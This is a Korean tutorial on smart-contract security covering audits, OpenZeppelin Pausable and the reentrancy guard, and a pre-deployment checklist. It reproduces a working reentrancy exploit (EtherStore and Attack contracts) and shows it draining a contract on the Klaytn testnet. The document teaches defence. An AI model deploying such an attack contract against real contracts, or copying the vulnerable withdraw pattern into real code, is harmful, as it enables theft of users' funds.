# 컨트렉트 보안과 Audit(보안감사)
컨트렉트의 경우 실제 서비스에 런칭하기 전에 보안 전문 업체에게 오딧(보안감사)를 받게 된다.
보안감사의 경우에는 컨트렉트의 취약점을 분석한 후에 컨트렉트의 안정성에 문제가 없는지 여부를 검토하는 작업이다.
보안감사의 경우에는 취약한 정도에 따라서 레벨을 나누어서 응답을 하며
심각한 보안 사항의 경우는 거의 해결하는 편이지만 권고사항이나 가벼운 사항 중
중앙화 이슈와 같은 부분은 그냥 수정 없이 서비스를 오픈하는 편이기도 하다.

실무에서 서비스를 런칭할 때 주로 보안감사를 받는 기간을 염두해 두어야 하기 때문에 오딧 기간만큼 시간을 더 산정해야 한다.

주로 1~2주 정도의 기간이 보안감사에 걸리며 2주이상 걸리는 경우도 많다.
보안 감사를 받을 경우에는 해당 내용에 따라서 컨트렉트를 수정하고 다시 감사를 받아서 문제점이 해결되면 그때 코드를 다시 런칭한다.

다만 여기서 문제는 컨트렉트의 테스트를 보안감사업체가 해주는 것이 아니며 보안적인 취약점만 체크해주기 때문에 컨트렉트의 테스트는 직접 테스트 코드를 짜서 해야 한다.

보안감사는 컨트렉트 코드들이 정상 작동한다는 가정 하에 취약점을 분석해주는 것이며 따로 테스트 코드를 짜주는 과정도 있지 않기 때문에 정말 참고사항으로서만 두어야 하며 보안 감사를 받더라도 취약점이 발견되는 경우가 많기 때문에 테스트 코드를 소홀히 해서는 안된다.

# Openzepplin Security
https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/security

1.Pause & Unpause

컨트렉트 자체를 비활성화 시키고 활성화 시키는 부분

아래 함수들을 상속받은 pause와 unpause를 자체적으로 구현하여 활용한다.
```
    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
```

함수를 실행시키면 bool 값이 바뀌게 되고 bool값에 변동이 있을 시에 비활성화/ 활성화가 바뀌는 구조이다.
문제가 생길 경우 일시적으로 멈추도록 만드는 함수로 보안이 중요한 컨트렉트 및 함수에 넣게 되는데
최초 상호작용하는 하나의 함수에만 넣게되면 하위로 호출되는 함수에는 굳이 넣을 필요는 없다.

2. Re-enterancy

함수의 최종 결과가 리턴되기 전에 다시 한번 호출을 하는 부분으로서
외부 호출이 일어나는 경우 발생이 가능하다.

아래 소스 코드를 통해서 reEntrancyTest는 openzepplin의 reentrant guard를 적용하지 않은 부분이며
reEntracyTest2는 openzepplin의 reentrant guard를 적용한 부분이다.

해당 테스트를 통해서 리앤터런시 공격이 성공한것과 실패한 것을 볼 수 있는데

Attack 컨트렉트를 보면 deposit을 하자마자 바로 wihdraw를 하는 것을 볼 수 있으며
withdraw를 실행할때 지갑 주소로 이더를 주고 잔고 전송을 하게 되는데 이더를 주는 과정에서
fallback이 호출되게 되면 여기서 withdraw를 한번 더 실행한다.

따라서 1이더의 잔고까지 남았을 경우까지 fallback에서 withdraw가 진행되게 되므로 공격이 가능해지는 샘이다.

Source : https://solidity-by-example.org/hacks/re-entrancy/

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

```

테스트
```
npx hardhat test ./test/reEntrancyTest.ts
```

```
npx hardhat test ./test/reEntrancyTest2.ts
```

2개의 테스트 결과를 보면 


etherStore balance : etherStore BigNumber { value: "0" }
etherStore balance : etherStore BigNumber { value: "2000000000000000000" }

가드를 넣은 것만 정상작동하는 것을 볼 수가 있습니다.

이를 클레이튼 체인에 직접 해보겠습니다.

트랜잭션 영수증
https://baobab.scope.klaytn.com/tx/0x94691fa4f8e79199cce142ec98680dfe52a7be68770faf03790fbd1f41b8069c?tabId=internalTx

3Klay가 입금된 Attack 컨트렉트
https://baobab.scope.klaytn.com/account/0x19363fb72444525c2ddff3b016675f795ac656e5?tabId=txList


실제로 하실 때는 먼저 프라이빗 키를 각각 가져와야 합니다.
```
    klaytn: {
      url: process.env.RPC_URL_KLAYTN,
      accounts: [process.env.PRIVATE_KEY!, process.env.TEST_PRIVATE_KEY!, process.env.TEST_PRIVATE_KEY2!]
    }
```
결과
```
hyunkicho@Hyunkiui-MacBookPro tutorial_hardhat % npx hardhat run scripts/deposit.ts --network klaytn

etherStoreAddress :  0x50121b46288a62C4c55399751FCc311Da55B4229
attackAddress :  0xb8115C366655D0110EAf08601e9EFa6A171fFdCb
etherStore balance :  BigNumber { value: "2000000000000000000" }
before sending1 eth :  BigNumber { value: "0" }
before sending1 eth attack:  BigNumber { value: "0" }
before sending1 eth eve :  BigNumber { value: "99999475000000000000" }
etherStore balance etherStore:  BigNumber { value: "2000000000000000000" }
```

getBalance.ts의 contractAddress 부분에 새로 배포한 attack 컨트렉트의 주소를 넣어주고

attack 컨트렉트에 쌓이 이더리움을 한번 확인을 해보면 

```
hyunkicho@Hyunkiui-MacBookPro tutorial_hardhat % npx hardhat run scripts/getBalance.ts --network klaytn
0x19363fb72444525c2ddff3b016675f795ac656e5
0x3F8bE5375B82390d09E3fF60835eafb162bfeDcc
getBalance from attack contract
Balance of 0x3F8bE5375B82390d09E3fF60835eafb162bfeDcc is 3000000000000000000
```

3이더가 들어온 것을 확인할 수 있습니다.

그러나 리엔터런시 가드인 경우에는 오류가 나는것을 볼 수 있습니다.

```
hyunkicho@192 tutorial_hardhat % npx hardhat run scripts/deposit_guard.ts --network klaytn
etherStore address :  0x556083fb04F51c074076Ba77502F9EE6965f97d8
attack address :  0x451d9e584C881EBdf218f3b5f88c2619F3cc77b7
etherStore balance :  BigNumber { value: "2000000000000000000" }
before sending1 eth :  BigNumber { value: "0" }
before sending1 eth attack:  BigNumber { value: "0" }
before sending1 eth eve :  BigNumber { value: "46994131850000000000" }
etherStore balance etherStore:  BigNumber { value: "2000000000000000000" }
/Users/hyunkicho/fastcampusgit/blockchain101/pausableAndReenterancy/tutorial_hardhat/node_modules/@ethersproject/logger/src.ts/index.ts:269
        const error: any = new Error(message);
                           ^
Error: cannot estimate gas; transaction may fail or may require manual gas limit [ See: https://links.ethers.org/v5-errors-UNPREDICTABLE_GAS_LIMIT ] (reason="execution reverted: Failed to send Ether", method="estimateGas", transaction={"from":"0xD1c27AaDC8dcb7B5C9Ae7Ce1528d6CE599d69C3d","to":"0x451d9e584C881EBdf218f3b5f88c2619F3cc77b7","value":{"type":"BigNumber","hex":"0x0de0b6b3a7640000"},"data":"0x9e5faafc","accessList":null}, error={"name":"ProviderError","_stack":"ProviderError: HttpProviderError\n 
```

3. 컨트렉트 작성시 점검해야 할 기초 보안 사항

    1. 멀티시그 지갑 적용 여부 확인
       1. 멀티시그 지갑 적용시 몇개의 지갑을 사용할지 체크
       2. 관리자 권한 관련 문서 작성 및 공유

    2. 관리자 권한에 대한 구조 확인
       1. Ownable을 사용할 건지 아니면 다른 Role도 나누어서 관리할건지
       2. 별도의 Access구조가 필요한 컨트렉트인지
       3. 사용되는 관리자 권한에 따라 문서 작성 및 공유

    3. Pausable 적용 여부
       1. Pausable을 넣을지에 대한 여부 확인

    4. Re-entrancy
        1. 재진입 공격에 대한 방지가 제대로 이루어졌는지 확인

    5. 업그레이더블 적용 여부
       1. 탈중앙성이 떨어지더라도 업그레이더블 컨트렉트로 해야 될지 확인 (추후 기획 변경 가능성에 따라)

    6. 위의 사항들에 대해서 테스트코드를 작성해서 배포전에 제대로 작동하는지 체크해보기
